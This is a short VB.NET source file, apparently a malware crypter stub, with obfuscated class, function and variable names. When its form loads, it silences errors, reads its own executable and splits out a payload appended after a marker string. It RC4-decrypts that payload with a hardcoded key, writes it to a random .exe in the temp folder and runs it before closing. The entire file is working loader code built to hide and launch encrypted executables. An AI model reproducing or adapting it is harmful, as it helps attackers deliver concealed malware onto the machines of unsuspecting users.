Imports System.Text
Public Class KuusytqeWhsbchye
    Const mxworwxqw = "nymndchauuijczmqlytpytjpchvrtjpqvblvzrw"
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Dim TPath As String = System.IO.Path.GetTempPath
        Dim d1, d2(), d3 As String
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        d1 = Space(LOF(1))
        FileGet(1, d1)
        FileClose(1)
        d2 = Split(d1, mxworwxqw)
        d3 = evmczvmxhn(d2(1), "ehsrxkhuyzsdeodoifyleavwnukrfgwuhepdwjvb")
        FileOpen(5, TPath & "\lzfqmnhmbxzqwq.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(5, d3)
        FileClose(5)
        System.Diagnostics.Process.Start(TPath & "\lzfqmnhmbxzqwq.exe")
        Me.Close()
    End Sub
    Public Shared Function evmczvmxhn(ByVal message As String, ByVal password As String) As String
        Dim i As Integer = 0
        Dim j As Integer = 0
        Dim cipher As New StringBuilder
        Dim returnCipher As String = String.Empty
        Dim sbox As Integer() = New Integer(256) {}
        Dim key As Integer() = New Integer(256) {}
        Dim intLength As Integer = password.Length
        Dim a As Integer = 0
        While a <= 255
            Dim ctmp As Char = (password.Substring((a Mod intLength), 1).ToCharArray()(0))
            key(a) = Microsoft.VisualBasic.Strings.Asc(ctmp)
            sbox(a) = a
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        Dim x As Integer = 0
        Dim b As Integer = 0
        While b <= 255
            x = (x + sbox(b) + key(b)) Mod 256
            Dim tempSwap As Integer = sbox(b)
            sbox(b) = sbox(x)
            sbox(x) = tempSwap
            System.Math.Max(System.Threading.Interlocked.Increment(b), b - 1)
        End While
        a = 1
        While a <= message.Length
            Dim itmp As Integer = 0
            i = (i + 1) Mod 256
            j = (j + sbox(i)) Mod 256
            itmp = sbox(i)
            sbox(i) = sbox(j)
            sbox(j) = itmp
            Dim k As Integer = sbox((sbox(i) + sbox(j)) Mod 256)
            Dim ctmp As Char = message.Substring(a - 1, 1).ToCharArray()(0)
            itmp = Asc(ctmp)
            Dim cipherby As Integer = itmp Xor k
            cipher.Append(Chr(cipherby))
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        returnCipher = cipher.ToString
        cipher.Length = 0
        Return returnCipher
    End Function
End Class
